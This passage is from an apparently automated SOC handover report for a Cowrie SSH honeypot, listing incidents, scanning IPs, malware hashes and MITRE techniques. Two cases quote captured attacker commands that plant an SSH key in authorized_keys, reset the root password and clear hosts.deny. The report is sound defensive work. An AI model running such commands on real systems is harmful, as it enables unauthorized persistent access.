| `2026-04-04 21:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e0393842aaf

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-04 21:57 |
| **Last Seen** | 2026-04-04 21:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 21:57:13` | `cowrie.session.connect` |
| `2026-04-04 21:57:13` | `cowrie.client.version` |
| `2026-04-04 21:57:13` | `cowrie.client.kex` |
| `2026-04-04 21:57:14` | `cowrie.login.success` |
| `2026-04-04 21:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-886fb98d4826

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]232` |
| **First Seen** | 2026-04-04 21:58 |
| **Last Seen** | 2026-04-04 21:58 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ASUYIL22JHGV"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 21:58:09` | `cowrie.session.connect` |
| `2026-04-04 21:58:09` | `cowrie.client.version` |
| `2026-04-04 21:58:09` | `cowrie.client.kex` |
| `2026-04-04 21:58:10` | `cowrie.login.success` |
| `2026-04-04 21:58:10` | `cowrie.session.params` |
| `2026-04-04 21:58:10` | `cowrie.command.input` |
| `2026-04-04 21:58:10` | `cowrie.command.failed` |
| `2026-04-04 21:58:12` | `cowrie.log.closed` |
| `2026-04-04 21:58:12` | `cowrie.session.params` |
| `2026-04-04 21:58:12` | `cowrie.command.input` |
| `2026-04-04 21:58:12` | `cowrie.session.file_download` |
| `2026-04-04 21:58:12` | `cowrie.log.closed` |
| `2026-04-04 21:58:25` | `cowrie.session.params` |
| `2026-04-04 21:58:25` | `cowrie.command.input` |
| `2026-04-04 21:58:25` | `cowrie.log.closed` |
| `2026-04-04 21:58:26` | `cowrie.session.params` |
| `2026-04-04 21:58:26` | `cowrie.command.input` |
| `2026-04-04 21:58:26` | `cowrie.log.closed` |
| `2026-04-04 21:58:26` | `cowrie.session.params` |
| `2026-04-04 21:58:26` | `cowrie.command.input` |
| `2026-04-04 21:58:26` | `cowrie.session.file_download` |
| `2026-04-04 21:58:26` | `cowrie.log.closed` |
| `2026-04-04 21:58:27` | `cowrie.session.params` |
| `2026-04-04 21:58:27` | `cowrie.command.input` |
| `2026-04-04 21:58:27` | `cowrie.log.closed` |
| `2026-04-04 21:58:27` | `cowrie.session.params` |
| `2026-04-04 21:58:27` | `cowrie.command.input` |
| `2026-04-04 21:58:27` | `cowrie.log.closed` |
| `2026-04-04 21:58:28` | `cowrie.session.params` |
| `2026-04-04 21:58:28` | `cowrie.command.input` |
| `2026-04-04 21:58:28` | `cowrie.command.input` |
| `2026-04-04 21:58:28` | `cowrie.log.closed` |
| `2026-04-04 21:58:28` | `cowrie.session.params` |
| `2026-04-04 21:58:28` | `cowrie.command.input` |
| `2026-04-04 21:58:28` | `cowrie.log.closed` |
| `2026-04-04 21:58:29` | `cowrie.session.params` |
| `2026-04-04 21:58:29` | `cowrie.command.input` |
| `2026-04-04 21:58:29` | `cowrie.log.closed` |
| `2026-04-04 21:58:29` | `cowrie.session.params` |
| `2026-04-04 21:58:29` | `cowrie.command.input` |
| `2026-04-04 21:58:29` | `cowrie.log.closed` |
| `2026-04-04 21:58:30` | `cowrie.session.params` |
| `2026-04-04 21:58:30` | `cowrie.command.input` |
| `2026-04-04 21:58:30` | `cowrie.log.closed` |
| `2026-04-04 21:58:30` | `cowrie.session.params` |
| `2026-04-04 21:58:30` | `cowrie.command.input` |
| `2026-04-04 21:58:30` | `cowrie.log.closed` |
| `2026-04-04 21:58:31` | `cowrie.session.params` |
| `2026-04-04 21:58:31` | `cowrie.command.input` |
| `2026-04-04 21:58:31` | `cowrie.log.closed` |
| `2026-04-04 21:58:31` | `cowrie.session.params` |
| `2026-04-04 21:58:31` | `cowrie.command.input` |
| `2026-04-04 21:58:31` | `cowrie.log.closed` |
| `2026-04-04 21:58:32` | `cowrie.session.params` |
| `2026-04-04 21:58:32` | `cowrie.command.input` |
| `2026-04-04 21:58:32` | `cowrie.log.closed` |
| `2026-04-04 21:58:32` | `cowrie.session.params` |
| `2026-04-04 21:58:32` | `cowrie.command.input` |
| `2026-04-04 21:58:32` | `cowrie.log.closed` |
| `2026-04-04 21:58:32` | `cowrie.session.params` |
| `2026-04-04 21:58:32` | `cowrie.command.input` |
| `2026-04-04 21:58:33` | `cowrie.log.closed` |
| `2026-04-04 21:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]232` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-607b5256f7d0

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-04 21:58 |
| **Last Seen** | 2026-04-04 21:58 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 21:58:10` | `cowrie.session.connect` |
| `2026-04-04 21:58:10` | `cowrie.client.version` |
| `2026-04-04 21:58:10` | `cowrie.client.kex` |
| `2026-04-04 21:58:11` | `cowrie.login.success` |
| `2026-04-04 21:58:11` | `cowrie.session.params` |
| `2026-04-04 21:58:11` | `cowrie.command.input` |
| `2026-04-04 21:58:11` | `cowrie.command.failed` |
| `2026-04-04 21:58:11` | `cowrie.log.closed` |
| `2026-04-04 21:58:11` | `cowrie.session.params` |
| `2026-04-04 21:58:11` | `cowrie.command.input` |
| `2026-04-04 21:58:11` | `cowrie.session.file_download` |
| `2026-04-04 21:58:11` | `cowrie.log.closed` |
| `2026-04-04 21:58:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.103.123[.]232` | **23** | 2026-04-04 21:51 | 2026-04-04 22:04 | 39m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `13.81.183[.]28` | **12** | 2026-04-04 21:46 | 2026-04-04 21:58 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `106.245.246[.]26` | **2** | 2026-04-04 21:47 | 2026-04-04 22:25 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]201` | **2** | 2026-04-04 21:18 | 2026-04-04 21:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.251.143[.]14` | 1 | 2026-04-04 21:28 | 2026-04-04 21:29 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.93.37[.]178` | 1 | 2026-04-04 21:09 | 2026-04-04 21:09 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.194.142[.]167` | 1 | 2026-04-04 21:43 | 2026-04-04 21:43 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.47.3[.]197` | 1 | 2026-04-04 21:32 | 2026-04-04 21:32 | 14s | 0 | `T1592` | 🟢 LOW |
| `120.234.195[.]41` | 1 | 2026-04-04 22:02 | 2026-04-04 22:02 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `154.198.215[.]50` | 1 | 2026-04-04 21:14 | 2026-04-04 21:14 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.233.85[.]194` | 1 | 2026-04-04 21:09 | 2026-04-04 21:09 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `200.222.71[.]218` | 1 | 2026-04-04 21:24 | 2026-04-04 21:24 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `201.208.181[.]155` | 1 | 2026-04-04 22:22 | 2026-04-04 22:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `209.121.109[.]124` | 1 | 2026-04-04 21:47 | 2026-04-04 21:47 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `223.107.72[.]234` | 1 | 2026-04-04 20:31 | 2026-04-04 20:31 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.123.114[.]126` | 1 | 2026-04-04 21:28 | 2026-04-04 21:28 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.224.125[.]54` | 1 | 2026-04-04 22:12 | 2026-04-04 22:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.248.109[.]64` | 1 | 2026-04-04 21:52 | 2026-04-04 21:52 | 15s | 0 | `T1592` | 🟢 LOW |
| `49.124.154[.]169` | 1 | 2026-04-04 21:05 | 2026-04-04 21:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.46.182[.]10` | 1 | 2026-04-04 22:26 | 2026-04-04 22:26 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.205[.]74` | 1 | 2026-04-04 22:06 | 2026-04-04 22:06 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `49.124.154[.]169` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 10 |
| `66.132.172[.]201` | US | Censys, Inc. | **100** ⚠️ | 34 |
| `65.20.205[.]74` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 29 |
| `103.93.37[.]178` | IN | Ngc Broadband Pvt. Ltd. | **100** ⚠️ | 50 |
| `112.194.142[.]167` | CN | China Unicom Sichuan province network | **100** ⚠️ | 50 |
| `43.224.125[.]54` | LK | Lanka Government Cloud | **100** ⚠️ | 18 |
| `13.81.183[.]28` | NL | Microsoft Corporation | **100** ⚠️ | 50 |
| `118.47.3[.]197` | KR | Korea Telecom | **100** ⚠️ | 0 |
| `84.238.92[.]245` | DK | BOLIGNET-AARHUS F.M.B.A. | **100** ⚠️ | 50 |
| `27.123.114[.]126` | IN | Bharti Airtel Limited | **100** ⚠️ | 41 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 66 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 28 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 16 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 8 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 8 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 76 cases |
| Tool 34  | Credential Extractor        | ✅ 44 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 27 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (5.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 22 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 16 priority case(s) shown individually · 21 recon entry/entries in table (4 group(s) consolidating 39 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-04T22:28:32Z_
